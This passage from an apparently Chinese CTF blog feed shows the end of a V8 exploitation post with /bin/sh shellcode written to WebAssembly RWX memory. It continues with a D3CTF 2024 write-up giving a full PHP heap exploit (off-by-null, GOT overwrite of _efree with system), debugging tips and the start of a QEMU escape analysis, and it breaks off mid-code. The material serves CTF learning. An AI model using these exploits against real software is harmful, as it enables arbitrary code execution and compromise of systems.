<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>十分简单的入门了一下 <code>v8</code> 漏洞利用，该类漏洞以及利用方式还有很多，看来有的学了<br>今天 <code>Csome</code> 学长在 <code>defcon</code> 拿了一血，太牛拉  </p><img src="/2024/05/05/v8start/10.png" class="" title="我的图图呢">  <p>哎，我也想成为像他那么强，还有很长的路要走啊。md，不说那么多了，开卷！！！<br>参考：<br><a href="https://www.anquanke.com/post/id/267518">https://www.anquanke.com/post/id/267518</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/130124693">https://blog.csdn.net/qq_45323960/article/details/130124693</a><br><a href="https://blog.csdn.net/weixin_46483787/article/details/134934993">https://blog.csdn.net/weixin_46483787/article/details/134934993</a><br><a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>D3CTF 2024</title>
      <link href="/2024/04/29/d3ctf2024/"/>
      <url>/2024/04/29/d3ctf2024/</url>
      
        <content type="html"><![CDATA[<h2 id="PwnShell"><a href="#PwnShell" class="headerlink" title="PwnShell"></a>PwnShell</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>很久以前就听说过 <code>php pwn</code>，没想到就在这里遇到了。出题人自己实现了一个 <code>php</code> 扩展模块 <code>vuln.so</code>，很显然漏洞就来源于这里，通过逆向分析发现出题人在这个模块中实现的菜单堆，其漏洞函数如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_addHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v11; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+8h] [rbp-40h] BYREF</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      v6 = &amp;chunkList[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">while</span> ( *v6 != <span class="number">1</span> )                        <span class="comment">// 寻找空闲堆块</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 += <span class="number">0x10</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[<span class="number">4</span> * v2];</span><br><span class="line">      v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL) + <span class="number">0x10</span>LL);<span class="comment">// v14字符串长度+0x10</span></span><br><span class="line">      v9 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL));<span class="comment">// v15字符串的长度</span></span><br><span class="line">      *v8 = v9;                                 <span class="comment">// 存v15的地址</span></span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL);<span class="comment">// v15字符串长度</span></span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">0x18</span>LL);<span class="comment">// v15字符串的起始地址</span></span><br><span class="line">      v8[<span class="number">1</span>] = v10;                              <span class="comment">// 存v15字符串的长度</span></span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);                     <span class="comment">// 复制v15字符串内容到v9中</span></span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8 + <span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">0x18</span>LL), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">0x10</span>LL);<span class="comment">// 存v14字符串的长度</span></span><br><span class="line">      *(_QWORD *)v7 = v8;</span><br><span class="line">      v7[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">      *((_BYTE *)v8 + v13 + <span class="number">0x10</span>) = <span class="number">0</span>;          <span class="comment">// 存在off by null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v16 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先对部分语句进行介绍，首先是下面这段代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>其作用是获取函数的参数个数。接下来是 <code>zend_parse_parameters</code> 函数，其函数原型为：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">END_API <span class="type">int</span> <span class="title function_">zend_parse_parameters</span><span class="params">(<span class="type">int</span> num_args, <span class="type">const</span> <span class="type">char</span> *type_spec, ...)</span></span><br></pre></td></tr></table></figure><p>第一个参数是传递的参数个数。通常使用 <code>ZEND_NUM_ARGS()</code> 来获取。 第二个参数是一个字符串，指定了函数期望的各个参数的类型，后面紧跟着需要随参数值更新的变量列表。 因为 <code>php</code> 采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。<br>下表列出了可能指定的类型：  </p><table><thead><tr><th>类型指定符</th><th>对应的C类型</th><th>描述</th></tr></thead><tbody><tr><td>l</td><td>long</td><td>符号整数</td></tr><tr><td>d</td><td>double</td><td>浮点数</td></tr><tr><td>s</td><td>char *, int</td><td>二进制字符串，长度</td></tr><tr><td>b</td><td>zend_bool</td><td>逻辑型（1或0）</td></tr><tr><td>r</td><td>zval *</td><td>资源（文件指针，数据库连接等）</td></tr><tr><td>a</td><td>zval *</td><td>联合数组</td></tr><tr><td>o</td><td>zval *</td><td>任何类型的对象</td></tr><tr><td>O</td><td>zval *</td><td>指定类型的对象。需要提供目标对象的类类型</td></tr><tr><td>z</td><td>zval *</td><td>无任何操作的zval</td></tr></tbody></table><p>例如下面的例子：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure><p>该表达式则是获取两个参数 <code>str</code> 和 <code>n</code>，字符串的类型是 <code>s</code>，需要两个参数 <code>char *</code> 字符串和 <code>int</code> 长度；数字的类型 <code>l</code> ，只需要一个参数。<br>现在重新回到题目的代码，可以看到存在一个 <code>off by null</code> 漏洞（注释里面有写），这里我们就要先认识一下 <code>php</code> 的堆结构。<code>php</code> 的堆结构类似于 <code>libc 2.27</code> 的 <code>tcache</code>， 在 <code>tcache</code> 的基础上删去了 <code>head</code> 头。由此可见，<code>php</code> 的堆还是挺好利用的。由于 <code>vuln.so</code> 模块的 <code>RELRO</code> 开启状态为 <code>Partial RELRO</code>，所以我们可以通过 <code>off by null</code> 漏洞和堆风水修改堆块的 <code>fd</code> 指针，实现修改 <code>_efree</code> 函数的 <code>got</code> 表为 <code>system，</code>从而实现任意指令的执行<br>接下来的问题是如何泄露地址，这里需要用到一个 <code>linux</code> 的知识。<code>linux</code> 系统内核提供了一种通过 <code>/proc</code> 的文件系统，在程序运行时访问内核数据，改变内核设置的机制。<code>/proc</code> 是一种伪文件结构，也就是说是仅存在于内存中。<code>/proc</code> 中一般比较重要的目录是 <code>sys</code>、<code>net</code> 和 <code>scsi</code>，<code>sys</code> 目录是可写的，可以通过它来访问和修改内核的参数 <code>/proc</code> 中有一些以 <code>PID</code> 命名（进程号）的进程目录，可以读取对应进程的信息，另外还有一个 <code>/self</code> 目录，用于记录本进程的信息。也即可以通过 <code>/proc/$PID/</code> 目录来获得该进程的信息，但是这个方法需要知道进程的 <code>PID</code> 是多少，在 <code>fork</code>、<code>daemon</code> 等情况下，<code>PID</code> 可能还会发生变化。所以 <code>Linux</code> 提供了 <code>self</code> 目录，来解决这个问题，不过不同的进程来访问这个目录获得的信息是不同的，内容等价于 <code>/proc/</code> 本进程  <code>PID</code> 目录下的内容。所以可以通过 <code>self</code> 目录直接获得自身的信息，不需要知道 <code>PID</code>。<br>那么，我们这里只需要读取 <code>/proc/self/maps</code> 文件即可。然后，在输出中得到 <code>libc</code> 地址和 <code>vuln.so</code> 的地址。<br>这里，还需要用到 <code>php</code> 的一个技巧，即 <code>ob</code> 函数。在 <code>php</code> 中我们可以通过 <code>ob_start</code> 来打开缓冲区，然后程序的输出流就会被存储到变量中，我们可以使用 <code>ob_get_contents</code> 来获得 输出流，然后通过正则匹配从输出流中获得地址。<br>这部分可以当作板子来用，就像这一道题目用于泄露地址的代码为：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>exp：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>;<span class="variable">$i</span> &gt;= <span class="number">0</span>;<span class="variable">$i</span>--) <span class="variable">$hex</span>.= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4c490</span>;</span><br><span class="line"><span class="variable">$efree_got</span> = <span class="number">0x4038</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x3f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">0xe</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="number">0x61</span> + <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$aa</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>, <span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$aa</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$aaa</span>, <span class="variable">$b</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>,<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">7</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;c&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">8</span>, <span class="title function_ invoke__">int2str</span>(<span class="variable">$mod_base</span>+<span class="variable">$efree_got</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">int2str</span>(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这道题我感觉难点在于如何调试。这道题目给出了 <code>docker</code> 环境，所以我们可以在 <code>docker</code> 中启动 <code>gdbserver</code> 远程调试，其做法如下：  </p><img src="/2024/04/29/d3ctf2024/1.png" class="" title="我的图图呢">  <p>然后在另外一个终端中启动 <code>gdb</code>，然后输入 <code>target remote:8888</code> 即可连接<br>这里要注意的是，我 <code>docker</code> 是将其 <code>9999</code> 端口映射到物理机的 <code>8888</code> 端口，所以我在 <code>docker</code> 中启动 <code>gdbserver</code> 使用的是 <code>9999</code> 端口，在物理机中 <code>gdb</code> 远程连接的端口是 <code>8888</code><br>由于题目给的 <code>docker</code> 并没有安装 <code>gdbserver</code>，我们可以通过下面这条命令进行安装  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdbserver</span><br></pre></td></tr></table></figure><p>接下来就要说说调试技巧。由于程序要运行很多汇编代码后才会将 <code>vuln.so</code> 模块给加载进来，所以一直在 <code>gdb</code> 中使用 <code>si</code> 是行不通的，我的方法是在 <code>exp.php</code> 中使用 <code>fgetc(STDIN)</code> 来将程序卡住，然后在 <code>gdb</code> 中输入 <code>c</code> 来进行类似于断点的操作，但是这样的 <code>php</code> 文件运行时会发现系统报错说找不到 <code>fgetc</code> 这一个 <code>function</code>，这是应为在 <code>php.ini</code> 文件中将这一个函数给 <code>ban</code> 了，我们可以通过下面这一条指令来找到 <code>php.ini</code> 文件所在的文件夹  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep <span class="string">&quot;Configuration File (php.ini) Path&quot;</span></span><br></pre></td></tr></table></figure><p>在 <code>php.ini</code> 文件中我们找到 <code>disable_functions</code> 那个地方  </p><img src="/2024/04/29/d3ctf2024/2.png" class="" title="我的图图呢">  <p>可以看见我们要用的 <code>fgetc</code> 函数在最后一行，我们将其删除即可<br>下面给出一条用于查询 <code>php</code> 扩展模块所在的路径的命令  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-config --extension-dir</span><br></pre></td></tr></table></figure><h2 id="D3EasyEscape"><a href="#D3EasyEscape" class="headerlink" title="D3EasyEscape"></a>D3EasyEscape</h2><p>这道题是 <code>qemu</code> 逃逸，之前没事干学了一下，这不刚好可以用上了，其关键函数如下：<br>l0dev_mmio_read：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">82LL</span>, <span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> 